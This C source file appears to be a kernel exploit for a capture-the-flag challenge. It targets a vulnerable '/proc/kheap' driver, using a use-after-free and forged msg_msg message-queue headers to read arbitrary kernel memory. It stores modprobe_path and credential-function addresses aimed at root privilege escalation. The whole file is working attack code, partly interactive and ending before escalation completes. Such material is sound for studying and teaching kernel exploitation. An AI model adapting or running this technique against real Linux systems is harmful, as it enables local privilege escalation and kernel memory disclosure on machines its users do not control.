#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/sendfile.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#define MSG_COPY                    040000  /* copy (not remove) all queue messages */


int do_print = 0x5702;
int pre_flag = 0x5704;
int cp_user = 0x5700;
int kefree = 0x5703;
int cp_from_user = 0x5701;

unsigned long modprobe_path_addr = 0xffffffffbdf3f4c0;
unsigned long leak_addr =          0xffffffffbc6ef2b0;


typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;

typedef struct _msgbuf_t {
    long mtype;
    char buf[0x10000];
}msgbuf_t;


kheap_req_t kheap_req;


char ezblock() {
    puts("blocking! intput c continue");
    char a;
    read(0, &a, 1);
    return a;
}


unsigned long print_value(unsigned long *ptr, int index)
{

    printf("[%2d] 0x%llx\n",index, ptr[index]);

    printf("\n");
    return ptr[index];
}

int open_fd()
{
    int fd = open("/proc/kheap", 0);
    return fd;
}

void free_slot(int fd)
{
    int ret = ioctl(fd, kefree, &kheap_req);
    printf("free %d\n", ret);
}

void read_slot(int fd)
{
    int ret = ioctl(fd, cp_user, &kheap_req);
    printf("read %d\n", ret);
}

void cpy_flag(int fd)
{
    int ret = ioctl(fd, pre_flag, &kheap_req);
    printf("cpy_flag %d\n", ret);
}

void write_slot(int fd)
{
    int ret = ioctl(fd, cp_from_user, &kheap_req);
    printf("write %d\n", ret);
}

typedef struct _msg_msg{
    unsigned long next;
    unsigned long prev;
    long m_type;
    size_t m_ts;
    unsigned long msgseg;
    void *security;
}msg_msg;

char buf [1024];
msg_msg msg_buf;
unsigned long pnext = 0;
unsigned long pprev = 0;

void arb_read(int fd_1, int msq_id, msgbuf_t* msgbuf, unsigned long addr)
{
    msg_buf.next = pnext;
    msg_buf.prev = pprev;
    msg_buf.m_type = 0x1;
    msg_buf.m_ts = 0x1f00;
    msg_buf.msgseg = addr;
    memcpy(buf, &msg_buf, sizeof(msg_buf));

    write_slot(fd_1);

    if (msgrcv(msq_id, msgbuf, 0x2000, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    printf("print kheap data\n");
    for (int i = 0; i < 0x1200/8;i++)
    {
        if (((unsigned long *)msgbuf->buf)[i] != 0)
            printf("0x%x: 0x%llx\n",i*8, ((unsigned long *)msgbuf->buf)[i]);
    }
    printf("print kheap data end\n");
}

void free_block(int fd_1, int msq_id, msgbuf_t* msgbuf, unsigned long addr)
{
    msg_buf.next = pnext;
    msg_buf.prev = pprev;
    msg_buf.m_type = 0x1;
    msg_buf.m_ts = 0x1f00;
    msg_buf.msgseg = addr;
    memcpy(buf, &msg_buf, sizeof(msg_buf));

    write_slot(fd_1);

    if (msgrcv(msq_id, msgbuf, 0x2000, 0, 0) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    printf("print kheap data\n");
    for (int i = 0; i < 0x1200/8;i++)
    {
        if (((unsigned long *)msgbuf->buf)[i] != 0)
            printf("0x%x: 0x%llx\n",i*8, ((unsigned long *)msgbuf->buf)[i]);
    }
    printf("print kheap data end\n");
}

int main()
{

    unsigned long do_print_addr = 0;
    int fd_save = -1;

    int fds[0x40] = {0};
    for(int i = 0; i < 0x40;i++){
        fds[i] = open("/proc/self/stat",0);
    }

    kheap_req.ubuf = buf;
    kheap_req.size = 0x1d0;

    unsigned long leak[2];
    memcpy(buf, "AAAAAAA", 8);
    // *(unsigned long *)(buf + 0x1f8) = 0xffffffff810b8bb0;

    int fd_1 = open_fd();

    free_slot(fd_1);
    size_t target_cachesize = 128;
    size_t msgsz = target_cachesize - 0x30;
    msgbuf_t* msgbuf = calloc(1, sizeof(msgbuf_t));
    puts("\nBEFORE creating messages\n");
    ezblock();

    key_t key = ftok("/leve6", 2);
    int msq_id = msgget(key, 0666 | IPC_CREAT) ;
    memset(msgbuf->buf, 0, 0x10000);

    for (int i = 0; i < 3;i++)
    {
        msgbuf->mtype = 1;
        memset(msgbuf->buf, i+1, 0xf00);
        if (msgsnd(msq_id, msgbuf, 0x200 - 0x30, 0) < 0) {
            perror ("MSGSND bad stuff happened!");
            exit(1);
        }
    }

    msgbuf->mtype = 1;
    memset(msgbuf->buf, 0, 0x10000);
    memset(msgbuf->buf, 4, 0xfd0);
    if (msgsnd(msq_id, msgbuf, 0xfd0 + 0x18, 0) < 0)
    {
        perror("MSGSND bad stuff happened! 3");
        exit(1);
    }

    kheap_req.size = 0x28;
    // set buf to be ???
    // Recreate message header to change size
    memset (buf, 0x01, 1024);
    // uint64_t *m_ts_addr = (((uint64_t *) (buf)) + 3);
    // *m_ts_addr = 0x800;

    memset(&msg_buf, 0, sizeof(msg_buf));
    msg_buf.m_type = 0x1;
    msg_buf.m_ts=0xfd0;
    memcpy(buf, &msg_buf, sizeof(msg_buf));

    ezblock();
    write_slot(fd_1);
    //ioctl(fd_1, 0x5701, &req);

    if (msgrcv(msq_id, msgbuf, 0x1000, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    printf("print kheap data\n");
    for (int i = 0; i < 0x800/8;i++)
    {
        if (((unsigned long *)msgbuf->buf)[i] != 0)
            printf("0x%x: 0x%llx\n",i*8, ((unsigned long *)msgbuf->buf)[i]);
    }
    printf("print kheap data end\n");



    msgbuf->mtype = 1;
    memset(msgbuf->buf, 0x00, 0x10000);
    unsigned long addr;
    printf("next_addr: ");
    scanf("%llx", &pnext);

    printf("prev_addr: ");
    scanf("%llx", &pprev);
    while (true)
    {
        char c = ezblock();
        if (c == 'c')
        {
            printf("addr: ");
            scanf("%llx", &addr);
            arb_read(fd_1, msq_id, msgbuf, addr);
        }
        else{
            break;
        }

    }

    printf("next_addr: ");
    scanf("%llx", &pnext);

    printf("prev_addr: ");
    scanf("%llx", &pprev);

    addr += 0x20;

    //free
    msg_buf.next = pnext;
    msg_buf.prev = pprev;
    msg_buf.m_type = 0x1;
    msg_buf.m_ts = 0x1f00;
    msg_buf.msgseg = addr;
    memcpy(buf, &msg_buf, sizeof(msg_buf));

    write_slot(fd_1);

    if (msgrcv(msq_id, msgbuf, 0x2000, 0, 0) < 0) {
        perror ("MSGRCV bad stuff happened!");
    }
    printf("print kheap data\n");
    for (int i = 0; i < 0x1200/8;i++)
    {
        if (((unsigned long *)msgbuf->buf)[i] != 0)
            printf("0x%x: 0x%llx\n",i*8, ((unsigned long *)msgbuf->buf)[i]);
    }
    printf("print kheap data end\n");

    unsigned long commit_creds = 0;
    unsigned long prepare_kernel_cred = 0;

    scanf("%llx", &commit_creds);
    scanf("%llx", &prepare_kernel_cred);

    //realloc
    msgbuf->mtype = 1;
    memset(msgbuf->buf, 0, 0x10000);
    memset(msgbuf->buf, 5, 0xfd0);
    if (msgsnd(msq_id, msgbuf, 0xfd0 + 0x18, 0) < 0)
    {
        perror("MSGSND bad stuff happened! 3");
        exit(1);
    }


    return 0;
}